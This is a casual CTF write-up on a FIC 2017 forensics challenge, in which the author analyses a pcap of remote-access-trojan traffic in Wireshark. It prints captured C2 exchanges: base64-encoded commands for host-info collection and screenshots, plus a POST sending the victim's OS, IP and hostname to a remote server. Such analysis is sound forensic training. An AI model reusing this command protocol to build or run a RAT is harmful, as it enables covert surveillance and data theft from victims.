## FIC2k17

Here we are, the end of the two days of FIC 2k17 ! It was great, everyone meet some news security company, and all my teammate were there to play the ACISSI challenges and the EPITA one the next day.

So I am gonna write some WriteUp'z and this is the firts one !

## RAT pcap

The challenge start with a pcapng, a huge one. So l'ets analyse it. 

We know that it's a RAT, so let's start with a HTTP Filter ..

![wireshark_RAT1](/public/images/wireshark_RAT1.png)

After checking all the http gateway packets, we find that the virus is checking a CnC each some seconds. The CnC return what to do to the virus by HTTP simple content encoded in BASE64.

exemple of command : 

```
GET /gate/command/VOzxzr8tuWOyNVEy76wEu3ifivHjgkDSxZjwVsjP/ HTTP/1.1
Host: 163.5.55.17:52140
User-Agent: python-requests/2.10.0
Connection: keep-alive
Accept-Encoding: gzip, deflate
Accept: */*



HTTP/1.0 200 OK
Date: Tue, 19 Jul 2016 10:13:12 GMT
Server: WSGIServer/0.2 CPython/3.5.0+
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN

eyJjbWQiOiAiZ2VuZXJpY19nZXRfaG9zdF9pbmZvcyIsICJrd2FyZ3MiOiB7fX0=

---

$ echo "eyJjbWQiOiAiZ2VuZXJpY19nZXRfaG9zdF9pbmZvcyIsICJrd2FyZ3MiOiB7fX0=" | base64 -d

{"cmd": "generic_get_host_infos", "kwargs": {}}


--- Response :

POST /gate/command/sync/VOzxzr8tuWOyNVEy76wEu3ifivHjgkDSxZjwVsjP/ HTTP/1.1
Host: 163.5.55.17:52140
User-Agent: python-requests/2.10.0
Connection: keep-alive
Accept-Encoding: gzip, deflate
Accept: */*
Content-Length: 91
Content-Type: application/x-www-form-urlencoded

arch=AMD64&release=8&os=Windows&version=6.2.9200&public_ip=184.75.221.115&hostname=Win8-sec

HTTP/1.0 200 OK
Date: Tue, 19 Jul 2016 10:13:13 GMT
Server: WSGIServer/0.2 CPython/3.5.0+
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN

e30=

---
$ echo "e30=" | base64 -d

{}
```

This is intresting, let's go a bit deeper inside this communication ! 

By going a "bit deeper", I found a screenshot command :  

```
GET /gate/command/VOzxzr8tuWOyNVEy76wEu3ifivHjgkDSxZjwVsjP/ HTTP/1.1
Host: 163.5.55.17:52140
User-Agent: python-requests/2.10.0
Connection: keep-alive
Accept-Encoding: gzip, deflate
Accept: */*


HTTP/1.0 200 OK
Date: Tue, 19 Jul 2016 10:13:30 GMT
Server: WSGIServer/0.2 CPython/3.5.0+
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN

eyJjbWQiOiAid2luZG93c19zY3JlZW5zaG90IiwgImt3YXJncyI6IHt9fQ==

---

$ echo "eyJjbWQiOiAid2luZG93c19zY3JlZW5zaG90IiwgImt3YXJncyI6IHt9fQ==" | base64 -d                                                                                                                                                                          0|09:52:10

{"cmd": "windows_screenshot", "kwargs": {}}
```


By Extracting all the screenshot via the save as option in the follow TCP Stream menu, I found the flag in a mspaint window :

![RAT_flag](/public/images/RAT_flag.png)

Great Na ?



